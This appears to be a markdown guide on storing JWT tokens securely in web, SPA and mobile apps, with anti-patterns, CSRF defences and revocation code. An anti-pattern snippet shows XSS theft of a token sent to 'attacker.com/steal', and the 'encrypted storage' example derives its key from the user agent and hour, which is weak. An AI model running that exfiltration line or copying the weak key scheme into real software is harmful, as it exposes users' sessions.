# Token Storage and Security

## 🔐 Secure Token Storage Strategies

Token storage is a critical security consideration in JWT authentication. This document covers best practices for storing tokens securely on both client and server sides.

## 🚫 What NOT to Do: Common Storage Anti-Patterns

### ❌ localStorage and sessionStorage (High Risk)

```javascript
// NEVER DO THIS - Vulnerable to XSS attacks
localStorage.setItem('jwt', token);
sessionStorage.setItem('refreshToken', refreshToken);

// Any XSS vulnerability can steal tokens
const stolenToken = localStorage.getItem('jwt');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

**Why this is dangerous:**
- ✗ Accessible via JavaScript (XSS vulnerability)
- ✗ Persists across browser sessions
- ✗ No built-in expiration
- ✗ Shared across all tabs and windows
- ✗ No CSRF protection

### ❌ Insecure Cookie Configuration

```javascript
// INSECURE cookie settings
res.cookie('token', jwt, {
  httpOnly: false,    // ❌ Accessible via document.cookie
  secure: false,      // ❌ Transmitted over HTTP
  sameSite: 'none',   // ❌ Vulnerable to CSRF
  maxAge: undefined   // ❌ No expiration
});
```

### ❌ URL Parameters and Headers

```javascript
// NEVER embed tokens in URLs
const apiUrl = `https://api.example.com/data?token=${jwt}`;

// URLs are logged, cached, and shared
// Tokens will appear in:
// - Server logs
// - Browser history  
// - Referrer headers
// - Analytics tools
```

## ✅ Secure Storage Solutions

### 1. HTTP-Only Cookies (Recommended)

```typescript
// Secure cookie configuration
const setSecureTokenCookie = (res: Response, token: string) => {
  res.cookie('accessToken', token, {
    httpOnly: true,                                    // ✅ Not accessible via JavaScript
    secure: process.env.NODE_ENV === 'production',    // ✅ HTTPS only in production
    sameSite: 'strict',                               // ✅ CSRF protection
    maxAge: 15 * 60 * 1000,                          // ✅ 15-minute expiration
    path: '/api',                                     // ✅ Limited scope
    domain: process.env.COOKIE_DOMAIN                 // ✅ Domain restriction
  });
};
```

**Security benefits:**
- ✅ Immune to XSS attacks (not accessible via JavaScript)
- ✅ Automatic expiration
- ✅ CSRF protection with SameSite
- ✅ HTTPS enforcement
- ✅ Path and domain restrictions

### 2. Secure Memory Storage (SPA Alternative)

```typescript
// In-memory token storage for SPAs
class SecureTokenStorage {
  private accessToken: string | null = null;
  private refreshToken: string | null = null;
  private tokenExpiry: number | null = null;
  
  setTokens(access: string, refresh: string, expiresIn: number): void {
    this.accessToken = access;
    this.refreshToken = refresh;
    this.tokenExpiry = Date.now() + (expiresIn * 1000);
    
    // Set automatic cleanup
    setTimeout(() => {
      this.clearTokens();
    }, expiresIn * 1000);
  }
  
  getAccessToken(): string | null {
    if (!this.accessToken || !this.tokenExpiry) {
      return null;
    }
    
    // Check if token is expired
    if (Date.now() >= this.tokenExpiry) {
      this.clearTokens();
      return null;
    }
    
    return this.accessToken;
  }
  
  clearTokens(): void {
    this.accessToken = null;
    this.refreshToken = null;
    this.tokenExpiry = null;
  }
  
  isAuthenticated(): boolean {
    return this.getAccessToken() !== null;
  }
}

// Usage in React/Vue/Angular
const tokenStorage = new SecureTokenStorage();
```

**Trade-offs:**
- ✅ Secure from XSS if no injection points exist
- ✅ Automatically cleared on page refresh
- ❌ Requires re-authentication on page reload
- ❌ Relies on application security (no XSS vulnerabilities)

### 3. Encrypted Client-Side Storage

```typescript
import CryptoJS from 'crypto-js';

class EncryptedTokenStorage {
  private readonly encryptionKey: string;
  private readonly storageKey = 'auth_data';
  
  constructor() {
    // Generate encryption key from user session data
    // NEVER hard-code this key
    this.encryptionKey = this.deriveEncryptionKey();
  }
  
  storeTokens(access: string, refresh: string): void {
    const data = {
      accessToken: access,
      refreshToken: refresh,
      timestamp: Date.now()
    };
    
    const encrypted = CryptoJS.AES.encrypt(
      JSON.stringify(data),
      this.encryptionKey
    ).toString();
    
    // Use sessionStorage for automatic cleanup
    sessionStorage.setItem(this.storageKey, encrypted);
  }
  
  getTokens(): { access: string; refresh: string } | null {
    try {
      const encrypted = sessionStorage.getItem(this.storageKey);
      if (!encrypted) return null;
      
      const decrypted = CryptoJS.AES.decrypt(encrypted, this.encryptionKey);
      const data = JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
      
      // Check age (additional security layer)
      const hoursSinceStorage = (Date.now() - data.timestamp) / (1000 * 60 * 60);
      if (hoursSinceStorage > 8) {  // 8-hour limit
        this.clearTokens();
        return null;
      }
      
      return {
        access: data.accessToken,
        refresh: data.refreshToken
      };
    } catch (error) {
      this.clearTokens();
      return null;
    }
  }
  
  clearTokens(): void {
    sessionStorage.removeItem(this.storageKey);
  }
  
  private deriveEncryptionKey(): string {
    // Derive key from user session, device fingerprint, etc.
    const userAgent = navigator.userAgent;
    const timestamp = Math.floor(Date.now() / (1000 * 60 * 60)); // Changes hourly
    
    return CryptoJS.SHA256(`${userAgent}${timestamp}`).toString();
  }
}
```

## 🛡️ CSRF Protection Strategies

### 1. SameSite Cookie Attribute

```typescript
// SameSite configuration
const cookieConfig = {
  sameSite: 'strict' as const,  // Strongest protection
  // sameSite: 'lax' as const,  // Allows some cross-site requests
  // sameSite: 'none' as const, // No protection (requires secure: true)
};
```

### 2. Double Submit Cookies

```typescript
// Generate CSRF token
const generateCSRFToken = (): string => {
  return crypto.randomBytes(32).toString('hex');
};

// Set CSRF token in cookie and require in headers
const setCSRFProtection = (res: Response): string => {
  const csrfToken = generateCSRFToken();
  
  res.cookie('csrf-token', csrfToken, {
    httpOnly: false,  // Needs to be accessible for header inclusion
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000
  });
  
  return csrfToken;
};

// Verify CSRF token
const verifyCSRF = (req: Request): boolean => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.headers['x-csrf-token'];
  
  return cookieToken && headerToken && cookieToken === headerToken;
};
```

### 3. Origin and Referrer Validation

```typescript
const validateRequest = (req: Request): boolean => {
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [];
  
  // Check Origin header
  if (origin && !allowedOrigins.includes(origin)) {
    return false;
  }
  
  // Check Referer header for additional validation
  if (referer) {
    const refererUrl = new URL(referer);
    if (!allowedOrigins.includes(refererUrl.origin)) {
      return false;
    }
  }
  
  return true;
};
```

## 🔒 Server-Side Token Management

### 1. Token Blacklisting/Revocation

```typescript
// Redis-based token blacklist
import Redis from 'redis';

class TokenBlacklist {
  private redis: Redis.RedisClientType;
  
  constructor() {
    this.redis = Redis.createClient({
      url: process.env.REDIS_URL
    });
  }
  
  async revokeToken(jti: string, expiresAt: number): Promise<void> {
    const ttl = Math.max(0, Math.floor((expiresAt * 1000 - Date.now()) / 1000));
    
    if (ttl > 0) {
      await this.redis.setex(`blacklist:${jti}`, ttl, 'revoked');
    }
  }
  
  async isTokenRevoked(jti: string): Promise<boolean> {
    const result = await this.redis.get(`blacklist:${jti}`);
    return result === 'revoked';
  }
  
  async revokeAllUserTokens(userId: string): Promise<void> {
    // Store user revocation timestamp
    const timestamp = Math.floor(Date.now() / 1000);
    await this.redis.set(`user_revoked:${userId}`, timestamp);
  }
  
  async isUserRevoked(userId: string, tokenIssuedAt: number): Promise<boolean> {
    const revokedTimestamp = await this.redis.get(`user_revoked:${userId}`);
    
    if (!revokedTimestamp) return false;
    
    return parseInt(revokedTimestamp) > tokenIssuedAt;
  }
}

// Usage in authentication middleware
const checkTokenRevocation = async (payload: JWTClaims): Promise<void> => {
  const blacklist = new TokenBlacklist();
  
  // Check individual token revocation
  if (await blacklist.isTokenRevoked(payload.jti)) {
    throw new Error('Token has been revoked');
  }
  
  // Check user-wide revocation
  if (await blacklist.isUserRevoked(payload.userId, payload.iat)) {
    throw new Error('All user tokens have been revoked');
  }
};
```

### 2. Session Management

```typescript
interface SessionData {
  id: string;
  userId: string;
  active: boolean;
  createdAt: Date;
  lastAccessedAt: Date;
  ipAddress: string;
  userAgent: string;
  refreshTokenHash: string;
  expiresAt: Date;
}

class SessionManager {
  private sessions = new Map<string, SessionData>();
  
  async createSession(data: {
    userId: string;
    ipAddress: string;
    userAgent: string;
    refreshToken: string;
    rememberMe: boolean;
  }): Promise<SessionData> {
    const sessionId = this.generateSessionId();
    const expiresAt = new Date();
    
    if (data.rememberMe) {
      expiresAt.setDate(expiresAt.getDate() + 30); // 30 days
    } else {
      expiresAt.setDate(expiresAt.getDate() + 1);  // 1 day
    }
    
    const session: SessionData = {
      id: sessionId,
      userId: data.userId,
      active: true,
      createdAt: new Date(),
      lastAccessedAt: new Date(),
      ipAddress: data.ipAddress,
      userAgent: data.userAgent,
      refreshTokenHash: await this.hashToken(data.refreshToken),
      expiresAt
    };
    
    this.sessions.set(sessionId, session);
    return session;
  }
  
  async validateSession(sessionId: string, refreshToken?: string): Promise<SessionData | null> {
    const session = this.sessions.get(sessionId);
    
    if (!session || !session.active || session.expiresAt < new Date()) {
      return null;
    }
    
    // Validate refresh token if provided
    if (refreshToken) {
      const isValid = await this.verifyTokenHash(refreshToken, session.refreshTokenHash);
      if (!isValid) {
        return null;
      }
    }
    
    // Update last accessed time
    session.lastAccessedAt = new Date();
    return session;
  }
  
  async revokeSession(sessionId: string): Promise<void> {
    const session = this.sessions.get(sessionId);
    if (session) {
      session.active = false;
    }
  }
  
  async revokeAllUserSessions(userId: string): Promise<void> {
    for (const session of this.sessions.values()) {
      if (session.userId === userId) {
        session.active = false;
      }
    }
  }
  
  private generateSessionId(): string {
    return crypto.randomBytes(32).toString('hex');
  }
  
  private async hashToken(token: string): Promise<string> {
    return bcrypt.hash(token, 12);
  }
  
  private async verifyTokenHash(token: string, hash: string): Promise<boolean> {
    return bcrypt.compare(token, hash);
  }
}
```

## 📱 Mobile App Storage Considerations

### iOS Keychain Integration

```typescript
// For React Native with react-native-keychain
import * as Keychain from 'react-native-keychain';

class iOSTokenStorage {
  private readonly service = 'MyAppJWT';
  
  async storeTokens(access: string, refresh: string): Promise<void> {
    const credentials = {
      username: 'tokens',
      password: JSON.stringify({
        accessToken: access,
        refreshToken: refresh,
        timestamp: Date.now()
      })
    };
    
    await Keychain.setInternetCredentials(
      this.service,
      credentials.username,
      credentials.password
    );
  }
  
  async getTokens(): Promise<{ access: string; refresh: string } | null> {
    try {
      const credentials = await Keychain.getInternetCredentials(this.service);
      
      if (!credentials) return null;
      
      const data = JSON.parse(credentials.password);
      return {
        access: data.accessToken,
        refresh: data.refreshToken
      };
    } catch (error) {
      return null;
    }
  }
  
  async clearTokens(): Promise<void> {
    await Keychain.resetInternetCredentials(this.service);
  }
}
```

### Android Encrypted Preferences

```typescript
// For React Native with react-native-encrypted-storage
import EncryptedStorage from 'react-native-encrypted-storage';

class AndroidTokenStorage {
  private readonly storageKey = 'auth_tokens';
  
  async storeTokens(access: string, refresh: string): Promise<void> {
    const data = {
      accessToken: access,
      refreshToken: refresh,
      timestamp: Date.now()
    };
    
    await EncryptedStorage.setItem(
      this.storageKey,
      JSON.stringify(data)
    );
  }
  
  async getTokens(): Promise<{ access: string; refresh: string } | null> {
    try {
      const stored = await EncryptedStorage.getItem(this.storageKey);
      
      if (!stored) return null;
      
      const data = JSON.parse(stored);
      return {
        access: data.accessToken,
        refresh: data.refreshToken
      };
    } catch (error) {
      return null;
    }
  }
  
  async clearTokens(): Promise<void> {
    await EncryptedStorage.removeItem(this.storageKey);
  }
}
```

## 🚨 Security Headers and CSP

### Content Security Policy

```typescript
// Express.js CSP configuration
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'unsafe-inline'", // Only if absolutely necessary
        "https://trusted-cdn.com"
      ],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.yourapp.com"],
      fontSrc: ["'self'", "https://fonts.googleapis.com"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

## 📊 Security Comparison Matrix

| Storage Method | XSS Protection | CSRF Protection | Persistence | Mobile Support | Complexity |
|---------------|----------------|-----------------|-------------|----------------|------------|
| **HTTP-only Cookies** | 🟢 Excellent | 🟢 Excellent | 🟡 Session-based | 🟡 Limited | 🟢 Low |
| **Memory Storage** | 🟡 Good* | 🔴 None | 🔴 None | 🟢 Excellent | 🟢 Low |
| **Encrypted Storage** | 🟡 Good* | 🔴 None | 🟢 Full | 🟢 Excellent | 🟡 Medium |
| **localStorage** | 🔴 None | 🔴 None | 🟢 Full | 🟢 Excellent | 🟢 Low |
| **Native Keychain** | 🟢 Excellent | 🟢 Good | 🟢 Full | 🟢 Excellent | 🟡 Medium |

*Depends on application having no XSS vulnerabilities

## 🎯 Best Practices Summary

### For Web Applications
1. **Use HTTP-only cookies** with `SameSite=strict`
2. **Implement proper CSRF protection**
3. **Set appropriate expiration times**
4. **Use HTTPS in production**
5. **Implement Content Security Policy**

### For Single Page Applications  
1. **In-memory storage** for maximum security
2. **Implement automatic token refresh**
3. **Clear tokens on navigation/reload**
4. **Use secure communication channels**

### For Mobile Applications
1. **Use native secure storage** (Keychain/EncryptedStorage)
2. **Implement biometric protection**
3. **Use certificate pinning**
4. **Implement app-level security measures**

---

**Navigation**
- ← Back to: [Express.js Implementation Guide](./expressjs-implementation-guide.md)
- → Next: [Refresh Token Strategies](./refresh-token-strategies.md)
- ↑ Back to: [JWT Authentication Research](./README.md)